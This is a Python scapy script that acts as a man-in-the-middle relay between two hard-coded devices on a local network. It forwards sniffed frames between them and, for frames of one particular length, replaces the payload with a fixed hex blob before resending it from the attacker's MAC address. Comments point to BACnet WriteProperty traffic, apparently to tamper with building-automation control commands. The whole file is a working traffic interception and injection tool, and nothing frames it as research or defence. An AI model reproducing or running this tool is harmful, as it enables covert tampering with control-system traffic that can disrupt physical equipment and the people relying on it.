#import re
#from time import sleep
import binascii
import random, string
from scapy.all import *

DST_IP1 = '192.168.200.1'
DST_IP2 = '192.168.200.200'

M_MAC = '00:05:1b:a8:6d:d3'#自分のMACアドレス

T_MAC1 = '00:04:01:14:00:03'
T_MAC2 = '00:04:01:16:02:1d'
#T_MAC1 = '00:40:1a:1e:e8:35' #192.168.24.10
#T_MAC2 = '74:2b:62:6b:bc:89' #192.168.24.254
#T_MAC1 = '00:50:ff:0b:12:72'#192.168.27.11
#T_MAC2 = '00:40:1a:1e:58:43'#192.168.27.14

PROTO_NUM = 17 #icmp:1 tcp:6 udp:17
PORT_NUM = 47808 #bacnet:47808
CH_POS = 114
TH1 = 848 #WriteProperty:71
PTYPE = 2048 #ipv4:2048

IF = "en8"
FILTER = "tcp and ether src "+ M_MAC

A_WORD ="30373930eb80db6180f784b2a3c8289c25fc2f47d86a83a113d10c8c19eff750418996e10a59ea7456b18d3118c6096114a80edfe58d5f1373f449486097a6ffdd437d9247fb9cb7f0334a3262c45a9d74004def9852f679b3b8c2c0926705a0eed6ab74dcbf7130b736c43496c0fd65bf50cb8f63eda4af2721d5d17786431d9dfd06b9ea36aa3d2d3dd8397ec9b2973ef1c74e949301041c13fbf2bc44ce6168aa5d2387251c200b2be022aedb2d742db3decd7a6e4a526877a7b52bc1d4988204ea175d02701a450790150efe12b20537edcaa794dcfe8ebf1f3a04cbe16b5959847ee94ca86ed75f707a4eb46d3e5e3f8bc51c61f1a7482e6e245adf8a8ce5e358ad81d11886f0eeb0a4ce209227fc2f47da6b8bab15d30c8c18e6f75d428896e10b50ea7954b38d3119cf096c16aa0edfe4845f1e72f74948619ea6f2dc407d9246f29cbaf0374a3263cd5a9074044def995bf674bcbdc2c0936e05ade1d3ab74ddb6713db930c43497c9fd68b157cb8f62e4a4a12026d5d1768f43139af506b9eb3faa332b35d8397fc0b2993bf8c74e959a010a191afbf2bd4cc6676aa85d23862d14260929e022afd3257228b1decd7b6642546d75a7b52ac9dc9e8606ea175c0a781c410590150ff61ab40235edcaa69cd4f889bd1f3a05c3e96d5f5b847ee844a068d15d707a4fbc6538573d8bc51d69f9a1402c6e245bd7828aede158ad80d91081f1ecb0a4cf289a20fd2d47da6a83a312d30e8c18e7ff55458894e10b51e27153b08f3119ce016411a90cdfe485571675f54b48619faefadb427f9246f394b2f732483263cc529873014fef995afe7cbbb9c0c0936f0da5e6d7a974ddb77935be37c63497c8f560b651c98f62e5aca92720d7d1768e4b1b9dfc04b9eb3ea23b2c3cda397fc1ba913cf0c54e959b09021e12f9f2bd4cc6676bab5f23862d1426082ae222afd3257229b2dccd7b6642546c76a5b52ac9dc9e8705e8175c0a781c400692150ff61ab40336efcaa69cd4f888be1d3a05c3e96d5e58867ee844a068d05e727a4fbc6538563e89c51d69f9a1412f6c245bd7828aece25aad80d91081f0efb2a4cf289a20fc2e45da6a83a312d20d8e18"

def relay_process(pkt):
    print("roop\n")
    if pkt[Ether].src == T_MAC1:
        pkt[Ether].dst = T_MAC2
    elif pkt[Ether].src == T_MAC2:
        pkt[Ether].dst = T_MAC1

    pkt[TCP].chksum = None

    if len(pkt) == TH1 :
        target(pkt)
    else :
        sendp(pkt,iface=IF)

def target(pkt):
    #print("Target!\n")
    print(pkt[Raw].load.hex())
    bstr = A_WORD #str(pkt[Raw].load.hex())
    pkt[Ether].src = M_MAC
    pkt[TCP].chksum = None
    pkt[Raw].load=binascii.unhexlify(bstr)
    #print(bytes(bstr.encode()))
    #print(bstr)
    sendp(pkt,iface=IF)

sniff(iface=IF, prn=relay_process, filter=FILTER, store=0)


